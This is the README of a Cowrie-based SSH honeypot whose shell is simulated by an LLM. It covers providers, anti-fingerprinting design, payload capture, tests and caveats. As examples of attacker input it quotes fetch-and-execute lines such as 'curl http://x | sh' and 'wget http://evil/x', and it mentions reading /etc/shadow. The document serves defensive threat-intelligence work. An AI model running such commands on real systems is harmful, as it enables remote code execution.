# llm-honeypot

LLM-powered SSH honeypot — a fork of [Cowrie](https://github.com/cowrie/cowrie)
whose interactive shell is driven by a pluggable LLM backend instead of a
static command emulator. The point is threat intel: keep attackers engaged
longer than a brittle emulator can, and capture the full command stream
plus the model's responses for analysis.

**For production deployment** (VPS provisioning, systemd, log rotation,
monitoring, cost estimation) see [`DEPLOY.md`](DEPLOY.md).

## What this fork adds on top of upstream Cowrie

Upstream Cowrie shipped a basic `llm` backend in 2025/26 — single hardcoded
HTTP client, hostname-switched between OpenAI and Anthropic, API-key only.
This fork replaces that with a provider abstraction:

- **`cowrie/llm/providers/`** — `LLMProvider` interface, dataclass request
  shape, Twisted-native HTTP plumbing, and a registry decorator. Adding a
  new backend is one file plus an entry in `__init__.py`.
- **`cowrie/llm/llm.py`** — `LLMClient` is now a thin adapter that picks a
  provider from config and delegates. Cowrie's `protocol.py` is untouched.
- **Anthropic prompt caching** — the persona/system prompt is mostly stable
  per session, so it's cached by default on Anthropic providers. Big latency
  and cost win once a session is more than a couple turns in.

### Built-in providers

| Provider           | Auth                       | Endpoint / Wire format            |
|--------------------|----------------------------|-----------------------------------|
| `anthropic_apikey` | `x-api-key` header         | `api.anthropic.com/v1/messages`, Messages API |
| `anthropic_oauth`  | OAuth bearer (macOS Keychain by default, file fallback on Linux) | `api.anthropic.com/v1/messages`, Messages API |
| `codex_apikey`     | `Authorization: Bearer` API key | `api.openai.com/v1/chat/completions`, chat-completions |
| `codex_oauth`      | OAuth bearer from `~/.codex/auth.json` | `chatgpt.com/backend-api/codex/responses`, SSE Responses API (Codex models only — `gpt-5.4-mini` default) |

OAuth providers consume a bearer token previously obtained via the official
CLI's auth flow (`claude auth login` / `codex auth login`). They don't perform
the OAuth dance themselves — `anthropic_oauth` reads macOS Keychain (service
`Claude Code-credentials`) automatically; everything else is config-overridable.

OAuth credentials reload-and-retry once on HTTP 401 (`_on_auth_failure` hook),
so a token refresh by the CLI mid-session doesn't drop the next attacker command.

## Quickstart

```bash
git clone https://github.com/allsmog/llm-honeypot.git
cd llm-honeypot
python3 -m venv .venv && source .venv/bin/activate
pip install -e .
cp src/cowrie/data/etc/cowrie.cfg.dist etc/cowrie.cfg
```

Edit `etc/cowrie.cfg`:

```ini
[honeypot]
backend = llm

[llm]
provider = anthropic_apikey
anthropic_api_key = sk-ant-xxx
model = claude-haiku-4-5-20251001
```

Then start it the normal Cowrie way:

```bash
bin/cowrie start
```

Attackers connect on port 2222 by default; sessions land in
`var/log/cowrie/cowrie.json`. Every LLM turn is logged at debug level when
`[llm] debug = true`.

## Switching providers

Same config file, change two lines:

```ini
# Use a Claude Pro/Max OAuth session
#   macOS: reads ~/Library Keychain entry "Claude Code-credentials" automatically
#   Linux: reads ~/.config/claude-code/credentials.json
# Override with anthropic_oauth_token_file if you've dumped the token elsewhere.
provider = anthropic_oauth
```

```ini
# Use an OpenAI API key
provider = codex_apikey
openai_api_key = sk-xxx
model = gpt-4o-mini
```

```ini
# Use a Codex CLI OAuth session
provider = codex_oauth
codex_oauth_token_file = ~/.codex/auth.json
```

## Using any other model

Before writing an adapter, check whether the `langchain` provider already
reaches your backend — it covers local Ollama, hosted OpenAI, Gemini,
Bedrock, vLLM and most things else, by config alone:

```ini
[llm]
provider = langchain
langchain_model = ollama:llama3.1     # provider:model, LangChain's form
```

```bash
pip install 'llm-honeypot[langchain]' langchain-ollama
```

It is an optional extra: LangChain is a large transitive dependency tree
and this host is deliberately internet-facing. It also bridges LangChain's
synchronous API onto Twisted with `deferToThread`, taking one worker from
the default pool of ten per in-flight call — so it queues under heavy
concurrency where the native HTTP providers do not.

## Adding a new provider

Write one when you need wire-level control the LangChain route doesn't give
you.

1. Create `src/cowrie/llm/providers/your_provider.py`:
   ```python
   from cowrie.llm.providers.base import LLMProvider, LLMRequest
   from cowrie.llm.providers.registry import ProviderRegistry

   @ProviderRegistry.register("your_provider")
   class YourProvider(LLMProvider):
       @property
       def endpoint(self): ...
       @property
       def model(self): ...
       def _build_headers(self): ...
       def _format_body(self, request: LLMRequest):
           # request.system_text(), NOT request.system — see below.
           ...
       def _parse_response(self, payload): ...

       @classmethod
       def validate_config(cls, config):
           # Return human-readable errors for missing credentials. Without
           # this the honeypot starts happily and fails on the attacker's
           # first command with a 401 and an empty shell.
           return []
   ```
2. Add it to the import tuple and `__all__` in
   `src/cowrie/llm/providers/__init__.py`.
3. Document its config keys in `cowrie.cfg.dist` under `[llm]`.

`LLMClient` then picks it up via `[llm] provider = your_provider`, and
`test_llm_provider_conformance.py` covers it automatically — it loops the
registry rather than naming providers.

**Three traps, all of which fail silently:**

- **Use `request.system_text()`, never `request.system`.** The interactive
  protocol only populates `system_blocks`; `system` stays empty. Read it
  directly and you send no system prompt at all — no persona, no world
  state, no instructions — and the honeypot answers plausibly enough that
  nothing looks broken while being a generic assistant. Only touch
  `system_blocks` yourself if you act on the per-block `cacheable` flag,
  as the Anthropic providers do for cache breakpoints.
- **Override `_normalize_usage` if your backend reports neither the
  Anthropic nor the OpenAI usage shape.** Otherwise `request.usage` stays
  empty, which reads downstream as "this turn was free": telemetry logs
  zeros and a per-session token cap never fires.
- **Override `_parse_stream_event` if you set `_supports_streaming()`
  True.** The default parses Anthropic's SSE event names. OpenAI-style
  chunks carry no `type` field at all, so the default matches nothing and
  the stream yields empty text; `providers.streaming.parse_openai_event` is
  supplied for that case. A mismatch is now logged and falls back to a
  buffered call rather than serving a blank shell, but it still costs a
  round trip.

## What the fork adds beyond the provider abstraction

- **Deterministic responder for identity/info commands.** The single
  biggest believability win. `whoami`, `id`, `groups`, `hostname`, `uname`
  (all flag forms), `arch`, `nproc`, `uptime`, `free`, `lscpu`, `ps`
  (`aux`/`-ef`/bare), `top -bn1`, `vmstat`, `ping -c N`, `df`/`df -h`,
  `mount`, `ss`/`netstat` (listening), `crontab -l`, `env`/`printenv`,
  `echo` (with `$VAR` expansion), `which`/`command -v`, `date`, `w`, and
  `cat` of `/etc/os-release`, `/etc/passwd`, `/etc/group`, `/etc/shadow`,
  `/etc/crontab`, `/proc/cpuinfo`, `/proc/meminfo` (full 54-field render),
  `/proc/mounts`, `/proc/loadavg`, `/etc/hostname`, … are rendered locally
  from the pinned persona + per-session WorldState in
  `cowrie/llm/responder.py` — never the model. This closes three honeypot
  fingerprints at once that the 2025 SoK on honeypots+LLMs calls out:
  **timing** (microsecond response with jitter, instead of the ~300–500ms
  model round-trip a scanner can time), **consistency** (the same facts
  every turn, derived from the same persona the LLM sees — `id www-data`
  and `cat /etc/passwd` always agree on uid 33; `nproc` matches the
  `/proc/cpuinfo` block count), and **cost** (zero API calls for the most
  common probe commands). Anything unrecognized — and any file the session
  has actually modified — falls through to the LLM unchanged. Toggle with
  `[llm] deterministic_responses` (default on).
- **Simple pipelines stay local.** The responder used to decline any
  command containing a `|`, so `free -m` was answered instantly and for
  free while `free -m | head -2` went to the model. Measured across the
  `attacker_sim` corpus that was **19% of all model-bound traffic** — and
  it included two of the three repeat probes in `FINGERPRINT_PROBE`, the
  adversary written specifically to catch the honeypot contradicting
  itself, so the consistency test was being routed to the component least
  able to stay consistent. `cowrie/llm/pipefilters.py` now runs the command
  locally and applies `head`/`tail`/`grep`/`wc` the way a real shell would.
  Model-bound share falls 48% → 39%; all three fingerprint re-probes now
  answer deterministically. Deliberately conservative: the first stage must
  be a command the emulator recognizes (so `curl http://x | sh` still
  reaches the download interceptor and its payload is still captured), and
  an unmodelled filter or flag defers the whole pipeline rather than
  guessing. `ls` is piped-aware, since real `ls` drops its column layout
  when stdout is not a tty — without that, `ls | wc -l` would report 1
  instead of the entry count and trade one fingerprint for another. Toggle
  with `[llm] pipe_filters` (default on).
- **Fact ledger: repeated questions get the same answer.** An attacker
  probing for a honeypot asks the same thing twice and compares. The model
  could not reliably comply: `history_window_turns` replays only the last
  16 turns and deterministic renders are excluded from it entirely, so a
  fact asserted 20 turns earlier was simply re-invented. WorldState now
  records what the session was told, keyed by *fact family* rather than
  command text (`cowrie/llm/factkeys.py`), so `uname -a`, `uname -r` and
  `cat /proc/version` count as one question — and `free -m | head -2` keys
  the same as `free -m`, which is what makes a re-probe in piped form
  detectable. Only model-generated answers are replayed into the prompt;
  what the emulator produced reproduces itself, so echoing it back would
  cost input tokens every turn and buy nothing. Commands whose answer is
  *meant* to change (`date`, `w`, `top`) are never tracked, since recording
  them would manufacture a contradiction out of correct behaviour. Toggle
  with `[llm] fact_ledger` (default on).
- **Per-session token cap.** `max_commands_per_session` counts turns; a
  session of long outputs can cost more than two hundred short ones. New
  `[llm] max_tokens_per_session` (0 = unlimited, the default) bounds actual
  spend, summed from what the provider reported rather than estimated. On
  exhaustion the session degrades to a plausible resource error and keeps
  going — deterministic commands cost nothing and keep working, so a
  capped-out session stays usable rather than dead.
- **Hardened system prompt.** `cowrie/llm/prompts.py` replaces the old
  two-sentence "simulate a Linux server" default with an explicit
  behavioral contract: output discipline (stdout/stderr bytes only, no
  markdown/preamble/prompt-echo), error fidelity (real `command not found`
  / `No such file or directory` / `Permission denied` wording),
  ground-truth consistency against the pinned facts + WorldState,
  never-break-character under social-engineering, and realistic handling
  of full-screen/continuous programs (`top`, `vim`, `tail -f`). Overridable
  via `[llm] system_prompt` / `system_prompt_exec`.
- **Effective-user tracking (su/sudo).** `su`, `su - user`, `sudo -i`,
  `sudo su -`, `sudo -u user …` push an effective-user stack in WorldState.
  `whoami`/`id` and the shell prompt (including the `$`→`#` sigil) reflect
  the top of the stack, and `exit` pops back to the parent shell instead of
  closing the connection — a detail real shells get right and most
  honeypots don't.
- **Background-process tracking.** `cmd &` / `nohup cmd &` registers a PID
  in WorldState; `ps` reflects launched payloads and the LLM prompt carries
  them so narration stays consistent across turns.
- **Fastpath for trivial commands.** `exit`/`logout`/`quit`, `cd`, `pwd`,
  `clear`, and empty input are handled in `lineReceived` without an LLM
  round-trip. `exit` actually exits (or pops an su subshell), `cd` updates
  `self.cwd` so the next LLM turn sees consistent state. Cuts per-session
  latency and cost.
- **`cd` can fail.** It is checked against the VFS — the same model `ls`
  and `stat` render from — so `cd /etc/apache2` is refused whenever
  `ls /etc` does not list it, and the three commands cannot contradict
  each other. Paths whose *parent* we never modelled are still accepted:
  saying nothing about a directory we never described is not a
  contradiction, but claiming it is absent would be. This also restores
  the chain semantics — a `cd` that could not fail made
  `cd /nope && wget http://evil/x` always fetch and `cd /nope || cd /tmp`
  never fall back.
- **Exit status drives `&&` / `||`.** `ResponderResult.exit_code` is
  separate from `is_error`, which answers a different question — "is this
  text stderr", used to make the pipeline path decline. They correlate but
  are not the same axis.
- **World mutations are transactional** (`cowrie/llm/state/`). Attacker
  input is parsed into *intents*, validated against the world, and
  committed only if the command is allowed to run — so a refused write
  leaves WorldState byte-for-byte unchanged. Before this, mutations were
  applied straight from the parsed input, so `echo secret > /root/private`
  as a non-root user answered "Permission denied" and recorded the file
  anyway, and the next `ls` listed it.

  Validation is all-or-nothing per command: no shell half-applies. It
  covers write permission, missing parent directories, missing `cp`/`mv`
  sources, and `su` to an account `/etc/passwd` does not list. Refusals are
  worded by the command that failed (`touch: cannot touch '…'` versus the
  shell's own `bash: …`) and never reach the model — we are the authority
  on whether a modelled mutation happened, and asking the model to narrate
  one would let it contradict us.

  Permissions read the same VFS nodes `ls` and `stat` render, so a
  directory shown as `drwxrwxrwt` cannot then refuse a write. A fidelity
  invariant cross-checks the two, since they are separate code paths.
  Unmodelled paths are permitted throughout: inventing a restriction no
  listing of ours supports is as detectable as inventing a permission.
- **LLM-turn logging.** Every command emits `cowrie.llm.prompt` and
  `cowrie.llm.response` events to the JSON log with `latency_ms`. Errors
  log `cowrie.llm.error`. All carry the session id so they correlate with
  the connect / command / login event stream.
- **Per-session command cap.** `[llm] max_commands_per_session` (default
  200) bounds API spend. After the cap, attackers see a canned
  `bash: cannot fork: Resource temporarily unavailable` line — plausible
  Linux behavior, less of a fingerprint than abrupt disconnect.
- **Fail-fast config validation.** Misconfigured `[llm]` (e.g. selected
  `anthropic_apikey` with no key) makes `cowrie start` exit non-zero
  with a clear error before the SSH listener binds. No more half-broken
  honeypots that fail silently per-connection.
- **OAuth token reload on 401.** When Claude Code or Codex CLI rotates
  the credential file, the provider re-reads on the first 401 and
  retries once. Same-token reloads don't retry (no infinite loop).
- **Persona pinning.** `[llm] persona = auto` picks one of six
  believable Linux profiles (Ubuntu 22.04/20.04, Debian 12/11, CentOS 7,
  Alpine 3.19), keyed deterministically off the attacker's source IP.
  Distro, kernel, /proc/cpuinfo model, memtotal, uptime range, package
  list all pinned in the system prompt — `uname -a`, `cat /etc/os-release`,
  `uptime`, `free`, `/proc/cpuinfo` stay consistent across turns.
- **Real payload capture.** `wget`/`curl`/`tftp`/`ftpget` are intercepted
  before the LLM and the actual bytes are fetched — HTTP/HTTPS via `treq`,
  TFTP via the RFC 1350 client, FTP via Twisted's `FTPClient` — then
  persisted under `[honeypot] download_path` with a SHA-256 filename and
  logged as `cowrie.session.file_download` (same event shape as upstream's
  shell backend). SSRF is gated by
  `cowrie.core.network.communication_allowed` — AWS/GCP metadata
  (169.254.169.254), RFC1918, loopback all blocked. A `[SHELL_OBSERVED]`
  block carrying the real bytes/sha/url/status is injected into the next
  LLM turn so its narration matches reality. `scp` is intent-only
  (refused-by-default; see Known limitations).
- **Per-session WorldState.** Files actually downloaded persist into a
  WorldState object that flows into the system prompt's mutable-tail
  segment. Multi-turn consistency: `curl -o /tmp/x ...` then `ls /tmp`
  then `wc -c /tmp/x` all report the real size and content type.
- **Two-segment Anthropic prompt caching.** The persona block (stable
  for the session) gets `cache_control: ephemeral`; the WorldState block
  doesn't. Cache hit rate stays high even when the world mutates,
  keeping per-turn latency low (~80–150ms hit vs ~300–500ms cold).
- **Tests.** 50 Twisted Trial tests under `cowrie/test/test_llm_*.py`
  covering provider registration, body framing per provider (Anthropic
  Messages and Codex Responses/chat-completions), 401-retry, validate-
  config, parser, observation rendering, leak strip, WorldState, persona.

## Test coverage

253 trial tests across 12 files under `src/cowrie/test/test_llm_*.py`,
all green (2 skipped on optional deps). The deterministic responder,
persona, WorldState, command parser, prompt contract, and fidelity
harness are heavily covered; `test_llm_responder.py` alone has 96 cases
asserting per-distro file behavior, cross-command consistency (`id` vs
`/etc/passwd`, `nproc` vs `/proc/cpuinfo`, `mount` vs `df` vs
`/proc/mounts`, `ss` vs `netstat`), batch/interactive handling
(`top -bn1`, `ping -c N`), the su/sudo effective-user flow, and graceful
deferral of anything not modeled.

| Module | Coverage |
|---|---|
| `persona.py` | 100% |
| `prompts.py` | 100% |
| `worldstate.py` | 98% |
| `cmd_parser.py` | 93% |
| `responder.py` | 93% |
| `fidelity.py` | 93% |
| `providers/streaming.py` | 92% |
| `providers/codex_apikey.py` | 90% |
| `providers/anthropic_apikey.py` | 88% |
| `providers/registry.py` | 88% |
| `protocol.py` | 69% |
| `providers/codex_oauth.py` | 65% |
| `downloader.py` | 61% |
| `providers/anthropic_oauth.py` | 61% |
| `providers/base.py` | 58% |
| `llm.py` | 31% |

## Fidelity evaluation

`scripts/fidelity_eval.py` (logic in `cowrie/llm/fidelity.py`) scores the
deterministic responder on the two believability axes the honeypot
literature uses, and doubles as a CI regression gate:

- **Consistency** — 35 cross-command / against-persona invariants that
  must hold (`uname -r` ⊂ `uname -a`, `nproc` == `/proc/cpuinfo` block
  count, `id www-data` == `/etc/passwd` uid 33, `hostname` ==
  `/etc/hostname`, `free` total == `/proc/meminfo` MemTotal, `/proc/meminfo`
  has a realistic field count, root device consistent across
  `mount`/`/proc/mounts`/`df`, `sshd:22` consistent across `ss`/`netstat`,
  `top -bn1` memory matches the persona, …). Pure — no network or host
  needed. The CLI exits non-zero if any fail, so it slots straight into CI
  (a `tox -e fidelity` env and a dedicated workflow job run it on every PR).
- **Coverage** — what fraction of a 44-command recon corpus the
  deterministic layer answers locally (currently 100% across all six
  personas) vs. defers to the LLM.
- **Reference** (`--reference local`, opt-in) — structural similarity of
  the honeypot's output to the **real host shell** after masking volatile
  tokens (hostnames, IPs, hashes, numbers, column widths). Only a hardcoded
  allowlist of read-only commands is ever run on the host — never an
  attacker payload. This is how the thin 12-line `/proc/meminfo` render was
  caught and expanded to the full 54-field set (an attacker `wc -l` tell).

```bash
PYTHONPATH=src python scripts/fidelity_eval.py --all-personas
PYTHONPATH=src python scripts/fidelity_eval.py --reference local
```

The Twisted glue files (`avatar.py`, `realm.py`, `server.py`,
`session.py`, `telnet.py`) are at 0% in trial — they're integration
points with the SSH channel layer and tested live via
`scripts/attacker_sim.py` which exercises 8 synthetic attacker patterns
end-to-end. The 80% trial-coverage target the v1 plan called for is
unreachable for these files without standing up a fake SSH transport.

Run coverage locally:
```bash
coverage run --source=src/cowrie/llm -m twisted.trial cowrie.test.test_llm_*
coverage report --include='*/cowrie/llm/*'
```

## Known limitations

- **scp upload capture (inbound).** `scp payload host:/path` runs
  `scp -t /path` on a raw exec channel below the command layer;
  `cowrie/llm/scp.py`'s `ScpSink` speaks that wire protocol — acking each
  control/data step and capturing the real bytes into an `Artifact` with
  the same `cowrie.session.file_download` event shape as the wget/curl
  path (SHA-256, dest path, size cap). Outbound scp (`scp -f`, download
  *from* us) stays refused-by-default to avoid becoming a file/credential
  source. Residual: only the SCP exec-channel form is captured; a `scp`
  *typed at the interactive shell* is still narrated as permission-denied
  by the LLM (that path never carries the binary stream).
- **Full-screen interactive programs are emulated, with residuals.**
  `top`/`htop`, `vi`/`vim`, and `less`/`more` take over the terminal
  (alternate screen + raw keystrokes via `cowrie/llm/interactive.py`): the
  program paints a believable screen, `top` repaints on its refresh timer,
  pagers/editors show the real file content (from the VFS/WorldState), and
  each exits the way the attacker expects (`top`: q; `vi`: `:q`/`:q!`/
  `:wq`/`ZZ`; `less`: q / space-at-end). **`vi` actually edits** — insert
  mode (i/a/A/I/o/O), cursor movement (h/j/k/l/0/$), `x` delete, Enter/
  Backspace — and a save (`:w`/`:wq`/`ZZ`) writes the buffer through to
  WorldState, so a later `cat`/`ls`/`stat` of the file reflects exactly what
  the attacker wrote (`vi /tmp/x` → type → `:wq` → `cat /tmp/x` returns it,
  deterministically). Residuals: the editor models the common subset, not
  all of vim (no `/` search, `dd`, visual mode); `nano`/`emacs`/`watch`
  still defer to the LLM; `top`'s process list refreshes a frame rather than
  live-sampling. A skilled human probing deep editor internals can still
  tell; automated tooling and casual operators generally can't. Toggle with
  `[llm] interactive_programs`.
- **Streaming responses are off by default.** Anthropic providers
  support it (`[llm] stream = true`); enabling it makes responses
  drip to the terminal rather than appear in one block, which is
  more realistic for `tail -f`-like commands. Trade-off: markdown
  stripping + observation-leak redaction run at end-of-stream rather
  than per chunk.
- **Pipeline filters are approximations, and only four of them.**
  `head`, `tail`, `grep` and `wc` are modelled; anything else — `awk`,
  `sed`, `sort`, `cut`, `xargs` — defers the whole pipeline to the model,
  so the failure mode is "slower", never "wrong". `grep` compiles patterns
  with Python's `re`, not POSIX BRE/ERE, so `-E` and `-P` are refused
  rather than approximated; an attacker comparing `grep` dialect behaviour
  precisely could still tell. Only single-command pipelines are handled —
  no redirection, no `&&`/`;`/`$()`.
- **The fact ledger reduces contradictions; it cannot prevent them.** It
  records what we said and shows the model its own earlier answer with an
  instruction to repeat. It cannot *force* compliance, because we
  deliberately do not parse model output (`cmd_parser.py`'s ABOUTME
  explains why that judgement stands). Commands with no recognized fact
  family are not tracked at all, and the prompt block is capped at
  `max_facts_in_prompt` — an attacker who probes more distinct facts than
  that will push the oldest out.
- **Token accounting misses non-interactive exec and lags one turn.**
  `ssh host 'cmd'` uses a legacy code path that never builds an
  `LLMRequest`, so its spend is invisible to `max_tokens_per_session`. And
  usage is only known after a response lands, so the cap is checked against
  what previous turns cost and can overshoot by a single response.
- **The LangChain provider queues under concurrency.** It bridges a
  synchronous library onto Twisted with `deferToThread`, consuming one
  worker from the default pool of ten per in-flight call. The native HTTP
  providers are fully async and have no such ceiling. Measure before
  pointing a busy sensor at it. It is also a large transitive dependency
  tree on an internet-facing host, which is why it is an optional extra.
## What we tried that did not work

**A minimax response planner.** We built a depth-limited minimax search
over eight response policies — MAX picks how the honeypot answers, MIN
picks the attacker's most damaging follow-up — with alpha-beta pruning
proven equivalent to a plain minimax oracle (exact value and root-move
agreement over 150 seeded states × depths 1–4, per-pair node dominance,
2162 → 216 nodes at depth 4 with move ordering). It is preserved at the
`minimax-planner-v1` tag and removed from the tree. `git revert` of the
removal commit restores it whole.

It was removed because measurement, not opinion, said it had no job:

- **It reproduced the if-ladder's decision on 100% of commands**, and
  depth-1 greedy matched depth-4 search exactly. On recon-heavy traffic
  the ladder is already near-optimal — pick the emulator when it can
  answer, the model when it cannot — so there was nothing to improve.
- **Where lookahead did diverge, it was wrong.** Over 3,000
  runtime-reachable states, 96% of divergence moved *away* from answering
  with the model — 60% of it toward emitting nothing at all. A worst-case
  MIN always plays the most damaging reply, so deep search learns "never
  speak," which is the inversion of a honeypot's purpose.
- **Expectimax, the textbook correction, made it worse.** Replacing the
  adversarial MIN with an expectation over an attacker prior *reduced*
  depth-4-vs-greedy divergence from 4.9% to 1.1%. It works by removing the
  punishment that was the only thing lookahead reacted to.
- **There is no prior to build that on.** All 34 sessions in our logs
  originate from `127.0.0.1`; they are `attacker_sim` talking to itself,
  and the 62 distinct commands in the logs are the 62 written into that
  file. Any distribution derived from them restates a fixture.

Two justifications we previously recorded for keeping it are false, and
worth correcting explicitly: accumulated safety signals cannot influence
the search (they are constant within a single search by construction), and
token pressure correlates *inversely* with divergence.

What survived is `scripts/routing_report.py`, the measurement built to
evaluate the planner. It found the piped-command gap that became this
week's most valuable fix, and now gates against that regressing.

- **Chained commands are split, but not fully parsed.** `;`, `&&` and `||`
  are honoured with real conditional semantics — `cd /tmp || cd /var/run`
  runs only the first, as bash does — and each segment goes through the
  ladder independently, so `cd /tmp && wget http://x` both changes
  directory and captures the payload. What is *not* modelled: command
  substitution, redirection, subshells, and backgrounding. A segment
  containing those declines to the model rather than being executed
  locally, so the failure mode is "narrated" rather than "wrong".
- **`scripts/probe_search.py` proves presence, not absence.** It searches
  for the shortest command sequence that exposes the honeypot, offline and
  deterministically. CI gates the **depth-1** sweep across all 96 behaviour
  configurations (~3.5 min); the depth-2 sweep is minutes-to-tens-of-minutes
  and is run manually or on a schedule, not per-push.
  A clean run means no detector exists *within its hand-written probe
  alphabet at that depth* — the alphabet inherits our blind spots, exactly
  as `routing_report` inherited the fastpath's. It also cannot see timing:
  the offline harness collapses the 1-10ms vs 300-2000ms gap that jitter
  only partly masks.

## Known security caveats

- **DNS TOCTOU in the SSRF gate.** `cowrie.core.network.communication_allowed(host)`
  resolves DNS once, validates the IP, and returns. The subsequent `treq.get`
  re-resolves to dial — between those two lookups, a malicious DNS could swap
  the record to point at 169.254.169.254 (cloud metadata) or another blocked
  range. Practical exposure is bounded: the fetched bytes are stored in a
  local `Artifact` and never routed back to the attacker (the LLM narrates
  from `WorldState` metadata only). The bytes do persist under
  `var/lib/cowrie/downloads/` though, so don't deploy this honeypot on a
  host with privileged IAM credentials, and rotate/inspect captures
  regularly. Upstream Cowrie has the same TOCTOU; fixing it requires a
  custom Twisted Agent with SNI preservation for HTTPS, which is a real
  but tractable follow-up rather than a v1 blocker.

## TOS reminder

**OAuth providers (`anthropic_oauth`, `codex_oauth`) consume session
tokens** issued for the official Claude Code / Codex CLIs. For personal
or research deployments to an unrouteable IP this is generally fine.
For wide-net public honeypot sensors, **use the API-key providers**
(`anthropic_apikey` / `codex_apikey`) — Anthropic and OpenAI TOS
restrict programmatic use of subscription session tokens. The fail-fast
config validation surfaces this choice clearly when you select a
provider in `cowrie.cfg`.

## Publishing this fork to GitHub

Pre-push checks done as part of writing this doc (no credentials anywhere
in history, `etc/cowrie.cfg` gitignored, captured payloads under
`var/lib/cowrie/downloads/` ignored via in-dir `.gitignore`, sensitive
state dirs all confirmed untracked). To push to your own GitHub fork:

```bash
# Sanity re-check before pushing (run these from cowrie/):
git log -p | grep -E "sk-ant-|sk-proj-|Bearer " | head        # should be empty
git check-ignore etc/cowrie.cfg                                # should echo path

# Create the fork on GitHub (web UI or `gh repo create your-user/llm-honeypot`)
# then:
git remote add origin git@github.com:your-user/llm-honeypot.git
git push -u origin main
```

`upstream` already points at cowrie/cowrie so future `git fetch upstream`
+ `git merge upstream/master` keeps your fork current.

## License

BSD-3-Clause, same as upstream Cowrie.
